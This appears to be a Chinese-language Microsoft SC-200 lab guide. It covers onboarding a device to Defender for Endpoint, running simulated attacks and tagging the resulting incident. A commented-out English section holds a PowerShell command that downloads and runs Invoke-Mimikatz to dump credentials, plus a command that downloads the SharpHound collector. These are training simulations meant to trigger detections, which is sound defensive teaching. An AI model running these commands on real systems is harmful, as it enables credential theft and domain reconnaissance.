---
lab:
  title: 练习 2 - 使用 Microsoft Defender for Endpoint 缓解攻击
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# 学习路径 2 - 实验室 1 - 练习 2 - 使用 Microsoft Defender for Endpoint 缓解攻击

## 实验室方案

![实验室概述。](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

你是一家公司的安全操作分析师，你的公司正在实施 Microsoft Defender for Endpoint。 你的主管计划加入一些设备，以深入了解安全运营 (SecOps) 团队响应程序所需的更改。

为了探索 Defender for Endpoint 的攻击缓解功能，你将运行两次模拟攻击。

>**注意：** 我们提供 **[交互式实验室模拟](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** ，让你能以自己的节奏点击浏览实验室。 你可能会发现交互式模拟与托管实验室之间存在细微差异，但演示的核心概念和思想是相同的。


### 任务 1：验证设备加入

在此任务中，你将确认设备已成功加入并创建测试警报。

1. 如果尚未访问 Microsoft Edge 浏览器中的 Microsoft Defender XDR 门户，请转到 (https://security.microsoft.com) 并以租户的管理员身份登录。

1. 在左侧菜单的“资产”区域下，选择“设备” 。 请等到 WIN1 出现在“设备”页面中，然后再继续操作。 否则，可能需要重复此任务以查看稍后将生成的警报。

    >**注意：** 如果你已完成载入过程，但在一小时后未在“设备”列表中看到设备，这可能指示存在载入或连接问题。

1. 从左侧菜单栏中选择“设置”，然后从“设置”页面中选择“终结点” 。

1. 在“设备管理”部分选择“加入”，并确保选择“Windows 10 和 11”作为操作系统。 “第一个设备已加入”消息现在显示“已完成” 。

1. 向下滚动，在“2. 运行检测测试”部分，选择“复制”按钮以复制检测测试脚本。  

1. 在 WIN1 虚拟机的 Windows 搜索栏中，键入“CMD”，然后在命令提示符应用的右窗格上，选择“以管理员身份运行” 。 

1. 显示“用户帐户控制”窗口时，选择“是”以允许应用运行。 

1. 粘贴脚本的方法是右键单击“管理员:**命令提示符”窗口，并按 Enter 键运行** 。

    >**注意：** 窗口在运行脚本后自动关闭。

### 任务 2：模拟攻击

>**注意：** 门户的“评估实验室”和“教程和模拟”部分不再可用。 以下步骤仅供参考。 有关模拟攻击的演示，请参阅[交互式实验室模拟](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)****。 我们正在努力寻找模拟攻击的替代项。

<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.

`Attack 1: Mimikatz - Credential Dumping`

1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.

1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.

1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.

`Attack 2: Bloodhound - Collection`

1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.

1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.

1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.

1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->

1. 在左侧菜单的“终结点”下，选择“评估和教程”，然后选择左侧的“教程和模拟”  。

1. 选择“教程”选项卡。

1. 在“自动调查(后门)”下，你将看到一条描述方案的消息。 在此段落下，单击“阅读演练”。 此时将打开一个新的浏览器选项卡，其中包含执行模拟的说明。

1. 在新浏览器选项卡中，找到名为“运行模拟”（第 5 页，从步骤 2 开始）的部分，并按步骤运行攻击。 提示：模拟文件 RS4_WinATP-Intro-Invoice.docm 可以在门户中找到，就在上一步中选择的“阅读演练”下方，通过选择“获取模拟文件”按钮获取 。

<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### 任务 3：调查攻击

1. 在 Microsoft Defender XDR 门户中，从左侧菜单栏中选择“事件和警报”，然后选择“事件”********。

1. 右窗格中有一个名为“在一个终结点上检测到多个威胁系列”的新事件。 选择事件名称以加载其详细信息。

    >**注意：** 你应在“警报”窗格中看到“Bloodhound”和“Mimikatz*”警报。****** 在“资产/设备”中，win1 计算机现在将具有“高”风险级别。************

1. 选中“管理事件”按钮，此时将显示一个新的窗口边栏选项卡。 

1. 在“事件标记”下，键入“模拟”，然后选择“模拟(新建)”以创建新标记。******** 

1. 选择切换“分配给”，将用户帐户（我）添加为事件所有者。 

1. 在“分类”下，展开下拉菜单。 

1. 在“参考性预期活动”下，选择“安全测试” 。 

1. 根据需要添加任何注释，然后选择“保存”以更新事件并结束。

1. 查看“攻击情景、警报、资产、调查、证据和响应”以及“摘要”选项卡的内容。 设备和用户位于“资产”选项卡下。“攻击情景”选项卡显示“事件图”。 提示：某些选项卡可能由于显示器的大小而被隐藏。 选择省略号选项卡 (...) 显示它们。

    >**警告：** 此处的模拟攻击非常适合实践式学习。 在使用 Azure 租户提供的课程时，请仅执行为本实验室提供的说明中的攻击。  在此租户完成此培训课程后，可以执行其他模拟攻击。**

## 你已完成本实验室。
